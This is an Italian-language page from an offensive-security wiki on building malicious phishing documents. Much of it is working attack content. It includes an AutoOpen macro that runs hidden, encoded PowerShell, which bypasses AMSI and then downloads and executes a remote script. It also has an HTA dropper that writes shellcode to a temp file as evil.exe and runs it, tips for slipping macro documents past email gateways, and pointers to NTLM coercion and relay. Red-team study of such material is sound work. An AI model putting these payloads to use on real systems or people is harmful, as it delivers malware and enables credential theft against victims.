# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word esegue la convalida dei dati del file prima di aprire un file. La convalida dei dati viene eseguita sotto forma di identificazione della struttura dei dati, rispetto allo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file in fase di analisi non verrà aperto.

Di solito, i file Word contenenti macro utilizzano l'estensione `.docm`. Tuttavia, è possibile rinominare il file cambiando l'estensione del file e mantenere comunque le loro capacità di esecuzione delle macro.\
Ad esempio, un file RTF non supporta le macro, per design, ma un file DOCM rinominato in RTF sarà gestito da Microsoft Word e sarà in grado di eseguire macro.\
Le stesse internals e meccanismi si applicano a tutto il software della Microsoft Office Suite (Excel, PowerPoint, ecc.).

Puoi utilizzare il seguente comando per controllare quali estensioni verranno eseguite da alcuni programmi Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX file che fanno riferimento a un modello remoto (File –Opzioni –Componenti aggiuntivi –Gestisci: Modelli –Vai) che include macro possono “eseguire” anche macro.

### Caricamento Immagine Esterna

Vai a: _Inserisci --> Parti Veloci --> Campo_\
&#xNAN;_**Categorie**: Collegamenti e Riferimenti, **Nomi dei file**: includePicture, e **Nome file o URL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### Backdoor Macro

È possibile utilizzare le macro per eseguire codice arbitrario dal documento.

#### Funzioni di Autoload

Più sono comuni, più è probabile che l'AV le rilevi.

- AutoOpen()
- Document_Open()

#### Esempi di Codice Macro
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Rimuovere manualmente i metadati

Vai su **File > Info > Ispeziona documento > Ispeziona documento**, che aprirà l'Ispezione documento. Clicca su **Ispeziona** e poi su **Rimuovi tutto** accanto a **Proprietà del documento e informazioni personali**.

#### Estensione Doc

Quando hai finito, seleziona il menu a discesa **Salva come tipo**, cambia il formato da **`.docx`** a **Word 97-2003 `.doc`**.\
Fallo perché **non puoi salvare macro all'interno di un `.docx`** e c'è uno **stigma** **attorno** all'estensione abilitata per le macro **`.docm`** (ad esempio, l'icona della miniatura ha un enorme `!` e alcuni gateway web/email le bloccano completamente). Pertanto, questa **estensione legacy `.doc` è il miglior compromesso**.

#### Generatori di macro malevoli

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## File HTA

Un HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente ed esegue come un'applicazione "completamente fidata", senza i vincoli del modello di sicurezza di un browser.

Un HTA viene eseguito utilizzando **`mshta.exe`**, che è tipicamente **installato** insieme a **Internet Explorer**, rendendo **`mshta` dipendente da IE**. Quindi, se è stato disinstallato, gli HTA non saranno in grado di eseguire.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzare l'autenticazione NTLM

Ci sono diversi modi per **forzare l'autenticazione NTLM "da remoto"**, ad esempio, potresti aggiungere **immagini invisibili** a email o HTML che l'utente accederà (anche HTTP MitM?). Oppure inviare alla vittima l'**indirizzo dei file** che **attiveranno** un'**autenticazione** solo per **aprire la cartella.**

**Controlla queste idee e altro nelle seguenti pagine:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Relay NTLM

Non dimenticare che non puoi solo rubare l'hash o l'autenticazione ma anche **eseguire attacchi di relay NTLM**:

- [**Attacchi di relay NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (relay NTLM ai certificati)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
